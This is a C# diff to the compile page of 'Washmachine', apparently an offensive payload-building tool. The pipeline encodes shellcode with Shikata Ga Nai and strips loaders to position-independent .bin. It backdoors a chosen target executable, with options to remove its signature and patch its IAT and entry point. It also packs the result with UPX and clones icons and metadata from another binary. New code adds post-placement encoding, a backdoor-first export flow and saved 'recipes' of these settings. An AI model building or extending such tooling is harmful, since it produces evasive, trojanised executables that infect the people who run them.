@@ -4,6 +4,8 @@ using Microsoft.UI.Xaml.Media;
 using System.Diagnostics;
 using System.IO.Compression;
 using System.Net.Http;
+using System.Text.Json;
+using System.Text.Json.Serialization;
 using Washmachine.Controllers;
 using Washmachine.Logging;
 using Washmachine.Models;
@@ -17,11 +19,19 @@ public sealed partial class CompilePage : Page
 {
     public static CompilePage? Instance { get; private set; }
 
+    // Read-only accessors used by PipelinePage to build the live recipe view.
+    public bool   IsStripToBinChecked      => StripToBinCheck?.IsChecked == true;
+    public string? OutputDirectory          => OutputPath?.Text;
+    public bool   GenerateDebugInfoEnabled => GenerateDebugInfo?.IsChecked == true;
+    public bool   VerboseBuildEnabled      => VerboseBuildCheck?.IsChecked == true;
+    public string? SelectedCompilerDisplay  => CompilerCombo?.SelectedItem?.ToString();
+
     private readonly IAppLogger _logger;
     private readonly AppPaths _paths;
     private readonly ICompilerService _compiler;
     private readonly ICompilerToolLocator _toolLocator;
     private readonly PeBackdoorService _backdoorService;
+    private readonly ICodeSnippetCatalogService _snippets;
     private string? _lastOutputPath;
     private List<CompilerToolCandidate>? _compilerCandidates;
 
@@ -41,10 +51,10 @@ public sealed partial class CompilePage : Page
         _logger = new RichEditBoxLogger(BuildLogBox);
         _toolLocator = new CompilerToolLocator(_logger);
         _backdoorService = new PeBackdoorService(_paths, _logger);
-        
+
         var bin2ShellRunner = new Bin2ShellRunner(_paths);
-        var snippetCatalog = new YamlCodeSnippetCatalogService(_paths);
-        _compiler = new CompilerService(_paths, bin2ShellRunner, snippetCatalog, _toolLocator, _logger);
+        _snippets = new YamlCodeSnippetCatalogService(_paths);
+        _compiler = new CompilerService(_paths, bin2ShellRunner, _snippets, _toolLocator, _logger);
 
         Loaded += CompilePage_Loaded;
     }
@@ -229,11 +239,13 @@ public sealed partial class CompilePage : Page
 
         // ── Build pipeline description ─────────────────────────────────
         var steps = new List<string> { "Template compile" };
-        if (mainPage?.IsShikataGaNaiEnabled == true)
-            steps.Insert(0, "Shikata Ga Nai");
-        steps.Insert(mainPage?.IsShikataGaNaiEnabled == true ? 1 : 0, "Bin2Shell");
+        if (mainPage?.IsShikataGaNaiEnabled == true && !mainPage.IsShikataGaNaiPostPlacement)
+            steps.Insert(0, "Shikata Ga Nai (pre)");
+        steps.Insert(mainPage?.IsShikataGaNaiEnabled == true && !mainPage.IsShikataGaNaiPostPlacement ? 1 : 0, "Bin2Shell");
         if (StripToBinCheck?.IsChecked == true)
             steps.Add("Strip to .bin");
+        if (mainPage?.IsShikataGaNaiEnabled == true && mainPage.IsShikataGaNaiPostPlacement)
+            steps.Add("Shikata Ga Nai (post)");
         if (backdoorPage?.IsBackdooringEnabled == true)
             steps.Add("Backdoor PE");
         if (packingPage?.IsPackingEnabled == true)
@@ -604,86 +616,160 @@ public sealed partial class CompilePage : Page
             var tempDir = Path.GetDirectoryName(compiledExePath);
 
             // ── Optional: Strip compiled exe to flat .bin ─────────────────
-            if (StripToBinCheck.IsChecked == true)
+            bool needPostSgn = mainPage.IsShikataGaNaiEnabled && mainPage.IsShikataGaNaiPostPlacement;
+            bool doStrip = StripToBinCheck.IsChecked == true || needPostSgn;
+            string? strippedBinPath = null;
+
+            if (doStrip)
             {
                 CompileProgressText.Text = "Step 1b: Stripping to flat .bin...";
                 _logger.Info("\n[Step 1b] Stripping loader to position-independent .bin...");
-                var strippedBin = await RunStripStepAsync(compiledExePath, tempDir ?? Path.GetTempPath());
-                if (strippedBin != null)
-                    _logger.Ok($"Stripped: {Path.GetFileName(strippedBin)}");
+                if (needPostSgn && StripToBinCheck.IsChecked != true)
+                    _logger.Info("  (strip auto-enabled because SGN placement = post)");
+                strippedBinPath = await RunStripStepAsync(compiledExePath, tempDir ?? Path.GetTempPath());
+                if (strippedBinPath != null)
+                    _logger.Ok($"Stripped: {Path.GetFileName(strippedBinPath)}");
                 else
                     _logger.Warn("Strip step failed or produced no output.");
             }
 
-            // Resolve final output directory — prompt with Save As if none set
-            string outputDir;
-            if (!string.IsNullOrWhiteSpace(OutputPath.Text))
+            // ── Optional: Post-placement SGN on stripped .bin ─────────────
+            if (needPostSgn)
             {
-                outputDir = OutputPath.Text;
-            }
-            else
-            {
-                var picker = new FileSavePicker();
-                picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
-                picker.SuggestedFileName = Path.GetFileName(compiledExePath);
-                picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });
-
-                var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
-                InitializeWithWindow.Initialize(picker, hwnd);
-
-                var file = await picker.PickSaveFileAsync();
-                if (file != null)
+                if (strippedBinPath != null && File.Exists(strippedBinPath))
                 {
-                    outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
-                    // Use the filename chosen by the user
-                    var dest = file.Path;
-                    File.Copy(compiledExePath, dest, overwrite: true);
+                    CompileProgressText.Text = "Step 1c: Applying SGN to stripped .bin...";
+                    _logger.Info("\n[Step 1c] Applying Shikata Ga Nai to stripped loader.bin (post placement)...");
+                    var sgnOut = await RunPostSgnStepAsync(
+                        strippedBinPath,
+                        mainPage.ShikataGaNaiEncodeCount,
+                        mainPage.ShikataGaNaiMaxBytes);
+                    if (sgnOut != null)
+                        _logger.Ok($"SGN-encoded: {Path.GetFileName(sgnOut)}");
+                    else
+                        _logger.Warn("SGN step failed — stripped .bin left unencoded.");
+                }
+                else
+                {
+                    _logger.Warn("SGN placement=post requested, but no stripped .bin was produced — skipping SGN.");
+                }
+            }
+
+            // ── Resolve final output: backdoor flow vs loader-only flow ───
+            //
+            // Backdoor enabled  → defer the Save dialog until AFTER backdooring,
+            //                     and only export the backdoored PE (the loader.exe and
+            //                     bin2shell intermediates stay in temp, never shipped).
+            // Backdoor disabled → keep the historical flow: prompt for the loader.exe
+            //                     destination up front and copy it there.
+            string outputDir;
+            bool backdoorEnabled = backdoorPage?.IsBackdooringEnabled == true
+                                    && backdoorPage.TargetPeFilePath != null;
+
+            if (backdoorEnabled)
+            {
+                // Run the backdoor step into temp first.
+                CompileProgressText.Text = "Step 2: Backdooring target PE...";
+                _logger.Info("\n[Step 2] Backdooring target executable...");
+
+                string backdoorWorkDir = tempDir ?? Path.GetTempPath();
+                string? originalShellcode = ResolveOriginalShellcodePath(mainPage);
+
+                if (originalShellcode == null || !File.Exists(originalShellcode))
+                {
+                    _logger.Error("Original shellcode .bin not found — cannot backdoor.");
+                    ShowCompileResult(false, "Backdoor step requires the original shellcode .bin.");
+                    return;
+                }
+
+                _logger.Info($"Using original shellcode: {Path.GetFileName(originalShellcode)} ({new FileInfo(originalShellcode).Length:N0} bytes)");
+                var backdooredTemp = await RunBackdoorStepAsync(backdoorPage!, originalShellcode, backdoorWorkDir);
+                if (backdooredTemp == null || !File.Exists(backdooredTemp))
+                {
+                    ShowCompileResult(false, "Backdoor step failed — see log.");
+                    return;
+                }
+
+                // Resolve where the backdoored PE should land (user choice, or pre-set OutputPath).
+                if (!string.IsNullOrWhiteSpace(OutputPath.Text))
+                {
+                    outputDir = OutputPath.Text;
+                    Directory.CreateDirectory(outputDir);
+                    var dest = Path.Combine(outputDir, Path.GetFileName(backdooredTemp));
+                    File.Copy(backdooredTemp, dest, overwrite: true);
                     currentOutput = dest;
                 }
                 else
                 {
-                    // User cancelled — keep in temp location
-                    outputDir = tempDir ?? Path.GetTempPath();
-                }
-            }
+                    var picker = new FileSavePicker();
+                    picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
+                    picker.SuggestedFileName = Path.GetFileNameWithoutExtension(backdoorPage!.TargetPeFilePath!) + "_backdoored";
+                    picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });
 
-            Directory.CreateDirectory(outputDir);
+                    var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
+                    InitializeWithWindow.Initialize(picker, hwnd);
 
-            // Copy compiled exe to output dir if not already there
-            if (string.Equals(currentOutput, compiledExePath, StringComparison.OrdinalIgnoreCase))
-            {
-                var finalInOutDir = Path.Combine(outputDir, Path.GetFileName(compiledExePath));
-                if (!string.Equals(compiledExePath, finalInOutDir, StringComparison.OrdinalIgnoreCase))
-                {
-                    File.Copy(compiledExePath, finalInOutDir, overwrite: true);
-                    currentOutput = finalInOutDir;
-                }
-            }
-
-            // ── Step 2: Backdoor target PE with ORIGINAL shellcode ─────
-            // The compiled .exe is a standalone loader (uses IAT imports, NOT position-independent).
-            // For PE backdooring we must inject the ORIGINAL raw shellcode .bin, not the compiled loader.
-            if (backdoorPage?.IsBackdooringEnabled == true && backdoorPage.TargetPeFilePath != null)
-            {
-                CompileProgressText.Text = "Step 2: Backdooring target PE...";
-                _logger.Info("\n[Step 2] Backdooring target executable...");
-
-                // Resolve the original shellcode .bin path
-                string? originalShellcode = ResolveOriginalShellcodePath(mainPage);
-                if (originalShellcode != null && File.Exists(originalShellcode))
-                {
-                    _logger.Info($"Using original shellcode: {Path.GetFileName(originalShellcode)} ({new FileInfo(originalShellcode).Length:N0} bytes)");
-                    currentOutput = await RunBackdoorStepAsync(backdoorPage, originalShellcode, outputDir)
-                                    ?? currentOutput;
-                }
-                else
-                {
-                    _logger.Warn("Original shellcode .bin not found — backdoor step skipped.");
+                    var file = await picker.PickSaveFileAsync();
+                    if (file != null)
+                    {
+                        outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
+                        Directory.CreateDirectory(outputDir);
+                        File.Copy(backdooredTemp, file.Path, overwrite: true);
+                        currentOutput = file.Path;
+                    }
+                    else
+                    {
+                        // User cancelled — leave the backdoored artifact in the temp work dir.
+                        outputDir = backdoorWorkDir;
+                        currentOutput = backdooredTemp;
+                    }
                 }
             }
             else
             {
                 _logger.Info("\n[Step 2] Backdooring: Skipped (disabled)");
+
+                // No backdoor → the loader.exe IS the deliverable.
+                if (!string.IsNullOrWhiteSpace(OutputPath.Text))
+                {
+                    outputDir = OutputPath.Text;
+                }
+                else
+                {
+                    var picker = new FileSavePicker();
+                    picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
+                    picker.SuggestedFileName = Path.GetFileName(compiledExePath);
+                    picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });
+
+                    var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
+                    InitializeWithWindow.Initialize(picker, hwnd);
+
+                    var file = await picker.PickSaveFileAsync();
+                    if (file != null)
+                    {
+                        outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
+                        File.Copy(compiledExePath, file.Path, overwrite: true);
+                        currentOutput = file.Path;
+                    }
+                    else
+                    {
+                        // User cancelled — keep in temp location.
+                        outputDir = tempDir ?? Path.GetTempPath();
+                    }
+                }
+
+                Directory.CreateDirectory(outputDir);
+
+                // Copy compiled exe to output dir if not already there.
+                if (string.Equals(currentOutput, compiledExePath, StringComparison.OrdinalIgnoreCase))
+                {
+                    var finalInOutDir = Path.Combine(outputDir, Path.GetFileName(compiledExePath));
+                    if (!string.Equals(compiledExePath, finalInOutDir, StringComparison.OrdinalIgnoreCase))
+                    {
+                        File.Copy(compiledExePath, finalInOutDir, overwrite: true);
+                        currentOutput = finalInOutDir;
+                    }
+                }
             }
 
             // ── Step 4: Pack (optional) ───────────────────────────────────
@@ -701,12 +787,19 @@ public sealed partial class CompilePage : Page
 
             _lastOutputPath = outputDir;
 
-            // Clean up temp build directory if output was saved elsewhere
-            if (tempDir != null && !string.Equals(tempDir, outputDir, StringComparison.OrdinalIgnoreCase))
+            // Clean up the cpp build tree.
+            // Default (KeepBuildArtifacts = false): wipe after every build so
+            //   temp/cpp/compiled/ doesn't accumulate stale timestamp+hash binaries.
+            // Opt-in: keep the artifacts. We still avoid wiping when the user explicitly
+            //   chose the temp dir as their output target (would delete the user's file).
+            var settings = AppSettingsService.Load();
+            bool keep = settings.KeepBuildArtifacts;
+            bool sameAsOutput = tempDir != null && string.Equals(tempDir, outputDir, StringComparison.OrdinalIgnoreCase);
+
+            if (tempDir != null && !sameAsOutput && !keep)
             {
                 try
                 {
-                    // Walk up from "Compiled BInaries" to the cpp temp root
                     var cppTempRoot = Path.GetDirectoryName(tempDir);
                     var dirToClean = cppTempRoot != null && Directory.Exists(cppTempRoot) ? cppTempRoot : tempDir;
                     Directory.Delete(dirToClean, recursive: true);
@@ -716,6 +809,10 @@ public sealed partial class CompilePage : Page
                 {
                     _logger.Debug($"Temp cleanup skipped: {cleanEx.Message}");
                 }
+            }
+            else if (tempDir != null && !sameAsOutput && keep)
+            {
+                _logger.Debug($"Keeping build artifacts in {Path.GetDirectoryName(tempDir)} (settings.KeepBuildArtifacts = true).");
             }
 
             _logger.Info("\n═══════════════════════════════════════════════");
@@ -817,6 +914,7 @@ public sealed partial class CompilePage : Page
             args.Add("--shikata-ga-nai");
             args.AddRange(["--shikata-enc", mainPage.ShikataGaNaiEncodeCount.ToString()]);
             args.AddRange(["--shikata-max", mainPage.ShikataGaNaiMaxBytes.ToString()]);
+            args.AddRange(["--sgn-placement", mainPage.ShikataGaNaiPlacement]);
         }
 
         // Snippets — read from coordinator's template options (combos live in the dialog, not the visual tree)
@@ -944,6 +1042,75 @@ public sealed partial class CompilePage : Page
                 _logger.Warn($"Shellcode source '{mainPage.CurrentShellcodeSource}' not supported for direct backdooring.");
                 return null;
         }
+    }
+
+    /// <summary>
+    /// Run SGN on the stripped loader .bin, producing a parallel .sgn.bin next to it.
+    /// This is the "post-Bin2Shell" SGN placement: the loader itself is unmodified,
+    /// but an additional SGN-wrapped artifact is emitted for external injection.
+    /// </summary>
+    private async Task<string?> RunPostSgnStepAsync(string strippedBinPath, int encodeCount, int maxBytes)
+    {
+        var sgnExe = _paths.SgnExecutable;
+        var candidates = new List<string>();
+        if (!string.IsNullOrWhiteSpace(sgnExe)) candidates.Add(sgnExe!);
+        candidates.Add("sgn.exe");
+        candidates.Add("sgn");
+
+        var baseName = Path.GetFileNameWithoutExtension(strippedBinPath);
+        var outDir = Path.GetDirectoryName(strippedBinPath) ?? Path.GetTempPath();
+        var outPath = Path.Combine(outDir, $"{baseName}.sgn.bin");
+
+        foreach (var candidate in candidates)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName = candidate,
+                    RedirectStandardError = true,
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                };
+                psi.ArgumentList.Add("-i"); psi.ArgumentList.Add(strippedBinPath);
+                psi.ArgumentList.Add("-o"); psi.ArgumentList.Add(outPath);
+                psi.ArgumentList.Add("-a"); psi.ArgumentList.Add("64");
+                psi.ArgumentList.Add("-c"); psi.ArgumentList.Add(encodeCount.ToString());
+                psi.ArgumentList.Add("-M"); psi.ArgumentList.Add(maxBytes.ToString());
+
+                _logger.Info($"  sgn -i <bin> -o <out> -a 64 -c {encodeCount} -M {maxBytes}");
+
+                using var process = Process.Start(psi);
+                if (process == null) continue;
+
+                var stdoutTask = process.StandardOutput.ReadToEndAsync();
+                var stderrTask = process.StandardError.ReadToEndAsync();
+                await process.WaitForExitAsync();
+
+                var stderr = await stderrTask;
+                var stdout = await stdoutTask;
+
+                if (process.ExitCode == 0 && File.Exists(outPath))
+                    return outPath;
+
+                _logger.Warn($"SGN exit {process.ExitCode}: {(string.IsNullOrWhiteSpace(stderr) ? stdout : stderr)}");
+                return null;
+            }
+            catch (System.ComponentModel.Win32Exception ex) when (ex.NativeErrorCode is 2 or 3)
+            {
+                // Not found — try the next candidate.
+                continue;
+            }
+            catch (Exception ex)
+            {
+                _logger.Error($"SGN process failed: {ex.Message}");
+                return null;
+            }
+        }
+
+        _logger.Warn("SGN executable not found. Run 'washmachine-cli provision' or install SGN.");
+        return null;
     }
 
     /// <summary>
@@ -1100,24 +1267,44 @@ public sealed partial class CompilePage : Page
         var packedOutput = Path.Combine(outputDir, "packed_" + Path.GetFileName(currentExe));
         var upxArgs = packingPage.GetUpxArguments();
 
-        var psi = new System.Diagnostics.ProcessStartInfo
+        async Task<(int ExitCode, string Output, string Error)> RunUpxAsync(string args)
         {
-            FileName               = upxPath,
-            Arguments              = $"{upxArgs} -o \"{packedOutput}\" \"{currentExe}\"",
-            RedirectStandardOutput = true,
-            RedirectStandardError  = true,
-            UseShellExecute        = false,
-            CreateNoWindow         = true,
-        };
+            var psi = new System.Diagnostics.ProcessStartInfo
+            {
+                FileName               = upxPath,
+                Arguments              = $"{args} -o \"{packedOutput}\" \"{currentExe}\"",
+                RedirectStandardOutput = true,
+                RedirectStandardError  = true,
+                UseShellExecute        = false,
+                CreateNoWindow         = true,
+            };
 
-        using var proc = System.Diagnostics.Process.Start(psi);
-        if (proc == null) return null;
+            using var proc = System.Diagnostics.Process.Start(psi);
+            if (proc == null)
+                return (-1, string.Empty, "Failed to start UPX process.");
 
-        var output = await proc.StandardOutput.ReadToEndAsync();
-        var error  = await proc.StandardError.ReadToEndAsync();
-        await proc.WaitForExitAsync();
+            var output = await proc.StandardOutput.ReadToEndAsync();
+            var error  = await proc.StandardError.ReadToEndAsync();
+            await proc.WaitForExitAsync();
+            return (proc.ExitCode, output, error);
+        }
 
-        if (proc.ExitCode == 0 && File.Exists(packedOutput))
+        var (exitCode, output, error) = await RunUpxAsync(upxArgs);
+
+        if (exitCode != 0 &&
+            upxArgs.Contains("--strip-relocs", StringComparison.OrdinalIgnoreCase) &&
+            error.Contains("--strip-relocs is not allowed with ASLR", StringComparison.OrdinalIgnoreCase))
+        {
+            _logger.Warn("UPX --strip-relocs is incompatible with ASLR binaries. Retrying without --strip-relocs...");
+            var retryArgs = string.Join(" ",
+                upxArgs
+                    .Split(' ', StringSplitOptions.RemoveEmptyEntries)
+                    .Where(arg => !arg.Equals("--strip-relocs", StringComparison.OrdinalIgnoreCase)));
+
+            (exitCode, output, error) = await RunUpxAsync(retryArgs);
+        }
+
+        if (exitCode == 0 && File.Exists(packedOutput))
         {
             _logger.Ok($"Packed: {Path.GetFileName(packedOutput)}");
             if (!string.IsNullOrWhiteSpace(output)) _logger.Info(output);
@@ -1158,4 +1345,317 @@ public sealed partial class CompilePage : Page
             });
         }
     }
+
+    private void OpenPipelinePage_Click(object sender, RoutedEventArgs e)
+    {
+        if (App.ActiveWindow is MainWindow mw)
+            mw.NavigateToPipeline();
+    }
+
+
+    // ═══════════════════════════════════════════════════════════════════════
+    //  Recipe export / import
+    // ═══════════════════════════════════════════════════════════════════════
+
+    public async Task<bool> ExportRecipeAsync(IntPtr ownerHwnd)
+    {
+        var recipe = CaptureRecipe();
+        var json = JsonSerializer.Serialize(recipe, new JsonSerializerOptions { WriteIndented = true });
+
+        var picker = new FileSavePicker();
+        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
+        picker.SuggestedFileName = $"washmachine_recipe_{DateTime.Now:yyyyMMdd_HHmmss}.json";
+        picker.FileTypeChoices.Add("Washmachine Recipe", new List<string> { ".json" });
+
+        InitializeWithWindow.Initialize(picker, ownerHwnd);
+
+        var file = await picker.PickSaveFileAsync();
+        if (file == null) return false;
+
+        try
+        {
+            await File.WriteAllTextAsync(file.Path, json);
+            _logger.Ok($"Recipe exported: {Path.GetFileName(file.Path)}");
+            return true;
+        }
+        catch (Exception ex)
+        {
+            _logger.Error($"Failed to export recipe: {ex.Message}");
+            return false;
+        }
+    }
+
+    public async Task<bool> ImportRecipeAsync(IntPtr ownerHwnd)
+    {
+        var picker = new FileOpenPicker();
+        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
+        picker.FileTypeFilter.Add(".json");
+
+        InitializeWithWindow.Initialize(picker, ownerHwnd);
+
+        var file = await picker.PickSingleFileAsync();
+        if (file == null) return false;
+
+        try
+        {
+            var json = await File.ReadAllTextAsync(file.Path);
+            var recipe = JsonSerializer.Deserialize<PipelineRecipe>(json);
+            if (recipe == null)
+            {
+                _logger.Error("Recipe file is empty or malformed.");
+                return false;
+            }
+            ApplyRecipe(recipe);
+            _logger.Ok($"Recipe imported: {Path.GetFileName(file.Path)}");
+            UpdateConfigurationSummary();
+            return true;
+        }
+        catch (Exception ex)
+        {
+            _logger.Error($"Failed to import recipe: {ex.Message}");
+            return false;
+        }
+    }
+
+    public PipelineRecipe CaptureRecipe()
+    {
+        var mainPage     = MainPage.Instance;
+        var backdoorPage = BackdooringPage.Instance;
+        var packingPage  = PackingPage.Instance;
+        var finalizePage = FinalizePage.Instance;
+
+        var recipe = new PipelineRecipe
+        {
+            Version = 1,
+            CreatedAt = DateTime.UtcNow,
+        };
+
+        if (mainPage != null)
+        {
+            recipe.Payload = new PayloadRecipe
+            {
+                Source = mainPage.CurrentShellcodeSource.ToString(),
+                File = mainPage.ShellcodeFileTextBox.Text,
+                RawHex = mainPage.ShellcodeRawTextBox.Text,
+                Url = mainPage.ShellcodeUrlTextBox.Text,
+                Generic = mainPage.GenericShellcodeCombo.SelectedItem?.ToString(),
+                TemplateId = mainPage.SelectedTemplateId,
+                EncoderIndex = mainPage.SelectedEncoderIndex,
+                EnvelopeIndex = mainPage.SelectedEnvelopeIndex,
+                SgnEnabled = mainPage.IsShikataGaNaiEnabled,
+                SgnEncodeCount = mainPage.ShikataGaNaiEncodeCount,
+                SgnMaxBytes = mainPage.ShikataGaNaiMaxBytes,
+                SgnPlacement = mainPage.ShikataGaNaiPlacement,
+            };
+
+            var opts = mainPage.Coordinator?.TemplateOptions;
+            if (opts != null)
+            {
+                foreach (var kv in opts.ComboValues) recipe.Payload.SnippetCombos[kv.Key] = kv.Value;
+                foreach (var kv in opts.TextValues) recipe.Payload.SnippetTexts[kv.Key] = kv.Value;
+                foreach (var kv in opts.ListValues) recipe.Payload.SnippetLists[kv.Key] = new List<string>(kv.Value ?? new List<string>());
+            }
+        }
+
+        if (backdoorPage != null)
+        {
+            recipe.Backdoor = new BackdoorRecipe
+            {
+                Enabled = backdoorPage.IsBackdooringEnabled,
+                TargetPePath = backdoorPage.TargetPeFilePath,
+                InjectionMethod = backdoorPage.SelectedInjectionMethod.ToString(),
+                CarrierInvoke = backdoorPage.SelectedCarrierInvoke.ToString(),
+                PreserveEntry = backdoorPage.PreserveOriginalEntry,
+                PatchIat = backdoorPage.PatchIat,
+                RemoveSignature = backdoorPage.RemoveSignature,
+                PatchSubsystem = backdoorPage.PatchSubsystemToGui,
+                PatchExit = backdoorPage.PatchExit,
+                DryRun = backdoorPage.DryRun,
+                XorKey = backdoorPage.XorKey,
+                SectionName = backdoorPage.CustomSectionName,
+                CaveMinSize = backdoorPage.CaveMinSize,
+                Encryption = backdoorPage.SelectedEncryption.ToString(),
+            };
+        }
+
+        if (packingPage != null)
+        {
+            recipe.Packing = new PackingRecipe
+            {
+                Enabled = packingPage.IsPackingEnabled,
+                CompressionLevel = packingPage.SelectedCompressionLevel,
+                UpxArgs = packingPage.GetUpxArguments(),
+            };
+        }
+
+        if (finalizePage != null)
+        {
+            recipe.Finalize = new FinalizeRecipe
+            {
+                Enabled = finalizePage.IsFinalizationEnabled,
+                CloneEnabled = finalizePage.IsCloneEnabled,
+                CloneSource = finalizePage.CloneSourceExePath,
+                CloneResources = finalizePage.CloneResources,
+                CloneIcon = finalizePage.CloneIcon,
+                CloneMetadata = finalizePage.CloneMetadata,
+                NopPaddingBytes = finalizePage.NopPaddingBytes,
+            };
+        }
+
+        recipe.Compile = new CompileRecipe
+        {
+            OutputPath = OutputPath?.Text,
+            OpenFolderAfter = OpenFolderAfterCompile?.IsChecked == true,
+            GenerateDebugInfo = GenerateDebugInfo?.IsChecked == true,
+            StripToBin = StripToBinCheck?.IsChecked == true,
+            Verbose = VerboseBuildCheck?.IsChecked == true,
+        };
+
+        return recipe;
+    }
+
+    public void ApplyRecipe(PipelineRecipe recipe)
+    {
+        var mainPage     = MainPage.Instance;
+        var backdoorPage = BackdooringPage.Instance;
+        var packingPage  = PackingPage.Instance;
+        var finalizePage = FinalizePage.Instance;
+
+        if (mainPage != null && recipe.Payload != null)
+        {
+            if (!string.IsNullOrEmpty(recipe.Payload.File))
+                mainPage.ShellcodeFileTextBox.Text = recipe.Payload.File;
+            if (!string.IsNullOrEmpty(recipe.Payload.RawHex))
+                mainPage.ShellcodeRawTextBox.Text = recipe.Payload.RawHex;
+            if (!string.IsNullOrEmpty(recipe.Payload.Url))
+                mainPage.ShellcodeUrlTextBox.Text = recipe.Payload.Url;
+
+            // Best-effort: apply SGN state by finding the checkbox/radios on MainPage
+            mainPage.ApplySgnRecipe(
+                recipe.Payload.SgnEnabled,
+                recipe.Payload.SgnEncodeCount,
+                recipe.Payload.SgnMaxBytes,
+                recipe.Payload.SgnPlacement);
+
+            // Template + encoder/envelope are best-effort from display text lookup
+            mainPage.ApplyTemplateAndEncoding(
+                recipe.Payload.TemplateId,
+                recipe.Payload.EncoderIndex,
+                recipe.Payload.EnvelopeIndex);
+
+            var opts = mainPage.Coordinator?.TemplateOptions;
+            if (opts != null && recipe.Payload.SnippetCombos.Count + recipe.Payload.SnippetTexts.Count + recipe.Payload.SnippetLists.Count > 0)
+            {
+                opts.ComboValues.Clear();
+                foreach (var kv in recipe.Payload.SnippetCombos) opts.ComboValues[kv.Key] = kv.Value;
+                opts.TextValues.Clear();
+                foreach (var kv in recipe.Payload.SnippetTexts) opts.TextValues[kv.Key] = kv.Value;
+                opts.ListValues.Clear();
+                foreach (var kv in recipe.Payload.SnippetLists) opts.ListValues[kv.Key] = new List<string>(kv.Value ?? new List<string>());
+            }
+        }
+
+        if (backdoorPage != null && recipe.Backdoor != null)
+        {
+            backdoorPage.ApplyRecipe(recipe.Backdoor);
+        }
+
+        if (packingPage != null && recipe.Packing != null)
+        {
+            packingPage.ApplyRecipe(recipe.Packing);
+        }
+
+        if (finalizePage != null && recipe.Finalize != null)
+        {
+            finalizePage.ApplyRecipe(recipe.Finalize);
+        }
+
+        if (recipe.Compile != null)
+        {
+            if (OutputPath != null) OutputPath.Text = recipe.Compile.OutputPath ?? "";
+            if (OpenFolderAfterCompile != null) OpenFolderAfterCompile.IsChecked = recipe.Compile.OpenFolderAfter;
+            if (GenerateDebugInfo != null) GenerateDebugInfo.IsChecked = recipe.Compile.GenerateDebugInfo;
+            if (StripToBinCheck != null) StripToBinCheck.IsChecked = recipe.Compile.StripToBin;
+            if (VerboseBuildCheck != null) VerboseBuildCheck.IsChecked = recipe.Compile.Verbose;
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  Recipe serialization models
+// ═══════════════════════════════════════════════════════════════════════
+
+public sealed class PipelineRecipe
+{
+    public int Version { get; set; } = 1;
+    public DateTime CreatedAt { get; set; }
+    public PayloadRecipe? Payload { get; set; }
+    public BackdoorRecipe? Backdoor { get; set; }
+    public PackingRecipe? Packing { get; set; }
+    public FinalizeRecipe? Finalize { get; set; }
+    public CompileRecipe? Compile { get; set; }
+}
+
+public sealed class PayloadRecipe
+{
+    public string? Source { get; set; }
+    public string? File { get; set; }
+    public string? RawHex { get; set; }
+    public string? Url { get; set; }
+    public string? Generic { get; set; }
+    public string? TemplateId { get; set; }
+    public int? EncoderIndex { get; set; }
+    public int? EnvelopeIndex { get; set; }
+    public bool SgnEnabled { get; set; }
+    public int SgnEncodeCount { get; set; } = 1;
+    public int SgnMaxBytes { get; set; } = 50;
+    public string SgnPlacement { get; set; } = "pre";
+    public Dictionary<string, string> SnippetCombos { get; set; } = new();
+    public Dictionary<string, string> SnippetTexts { get; set; } = new();
+    public Dictionary<string, List<string>> SnippetLists { get; set; } = new();
+}
+
+public sealed class BackdoorRecipe
+{
+    public bool Enabled { get; set; }
+    public string? TargetPePath { get; set; }
+    public string? InjectionMethod { get; set; }
+    public string? CarrierInvoke { get; set; }
+    public bool PreserveEntry { get; set; } = true;
+    public bool PatchIat { get; set; } = true;
+    public bool RemoveSignature { get; set; } = true;
+    public bool PatchSubsystem { get; set; } = true;
+    public bool PatchExit { get; set; } = true;
+    public bool DryRun { get; set; }
+    public string? XorKey { get; set; }
+    public string? SectionName { get; set; }
+    public int CaveMinSize { get; set; } = 64;
+    public string? Encryption { get; set; }
+}
+
+public sealed class PackingRecipe
+{
+    public bool Enabled { get; set; }
+    public string? CompressionLevel { get; set; }
+    public string? UpxArgs { get; set; }
+}
+
+public sealed class FinalizeRecipe
+{
+    public bool Enabled { get; set; }
+    public bool CloneEnabled { get; set; }
+    public string? CloneSource { get; set; }
+    public bool CloneResources { get; set; } = true;
+    public bool CloneIcon { get; set; } = true;
+    public bool CloneMetadata { get; set; } = true;
+    public long NopPaddingBytes { get; set; }
+}
+
+public sealed class CompileRecipe
+{
+    public string? OutputPath { get; set; }
+    public bool OpenFolderAfter { get; set; } = true;
+    public bool GenerateDebugInfo { get; set; }
+    public bool StripToBin { get; set; }
+    public bool Verbose { get; set; }
 }
